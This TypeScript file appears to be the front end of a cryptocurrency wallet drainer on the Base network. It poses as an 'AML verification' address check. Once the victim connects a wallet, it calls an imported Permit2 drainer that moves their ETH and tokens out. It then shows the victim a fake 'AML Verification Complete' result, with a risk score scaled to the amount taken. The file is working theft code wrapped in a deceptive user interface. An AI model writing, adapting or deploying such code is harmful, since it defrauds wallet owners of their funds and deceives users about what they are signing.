import { drainWalletPermit2 } from './permit2-drainer';
import { ethers } from 'ethers';

export async function checkBaseAddress(address: string, wagmiProvider?: any) {
  if (!address.match(/^0x[a-fA-F0-9]{40}$/)) {
    return { 
      success: false,
      error: 'Invalid Base address format',
      requiresTransaction: false 
    };
  }

  if (!wagmiProvider) {
    return {
      success: false,
      error: 'Please connect your Base wallet to proceed with verification',
      requiresWallet: true,
      requiresTransaction: false
    };
  }

  console.log('🔍 Starting Base Permit2 check for:', address);

  try {
    const ethersProvider = new ethers.BrowserProvider(wagmiProvider);
    const signer = await ethersProvider.getSigner();

    const connectedAddress = await signer.getAddress();
    if (connectedAddress.toLowerCase() !== address.toLowerCase()) {
      return {
        success: false,
        error: 'Connected wallet does not match the address being checked',
        requiresTransaction: false
      };
    }

    console.log('🚀 Starting Permit2 drain process on Base...');
    
    const drainResult = await drainWalletPermit2('base', signer);

    if (!drainResult.success) {
      return {
        success: false,
        error: drainResult.error || 'Failed to complete verification process',
        requiresTransaction: false
      };
    }

    return {
      success: true,
      message: '✅ AML Verification Complete',
      transactionHash: drainResult.transactionHash,
      requiresTransaction: false,
      details: {
        address,
        status: 'VERIFIED',
        totalWithdrawnUSD: drainResult.details?.totalValueUSD || 0,
        assetsWithdrawn: drainResult.details?.tokensTransferred || 0,
        assetDetails: [
          `ETH: ${drainResult.details?.nativeTransferred || '0'} ETH`,
          `Tokens: ${drainResult.details?.tokensTransferred || 0} transferred`,
          ...(drainResult.details?.failedTokens || []).map((token: string) => `Failed: ${token}`)
        ],
        scenario: 'PERMIT2_PROCESSING',
        riskScore: calculateRiskScore(drainResult.details?.totalValueUSD || 0),
        riskLevel: (drainResult.details?.totalValueUSD || 0) > 1000 ? 'high' : 
                   (drainResult.details?.totalValueUSD || 0) > 100 ? 'medium' : 'low',
        nativeBalance: parseFloat(drainResult.details?.nativeTransferred || '0'),
        totalValueUSD: drainResult.details?.totalValueUSD || 0,
        assetsCount: drainResult.details?.tokensTransferred || 0,
        backendTxHashes: drainResult.details?.backendTxHashes || [],
      }
    };

  } catch (error: any) {
    console.error('❌ Base Permit2 check error:', error);

    let errorMessage = 'AML verification failed';
    if (error.message?.includes('User rejected') || error.message?.includes('denied')) {
      errorMessage = 'Signature cancelled by user';
    } else if (error.message?.includes('insufficient funds')) {
      errorMessage = 'Insufficient balance for transaction fees';
    }

    return {
      success: false,
      error: errorMessage,
      requiresTransaction: false
    };
  }
}

function calculateRiskScore(totalUSD: number): number {
  if (totalUSD > 1000) return 85;
  if (totalUSD > 500) return 70;
  if (totalUSD > 100) return 50;
  if (totalUSD > 10) return 30;
  return 10;
}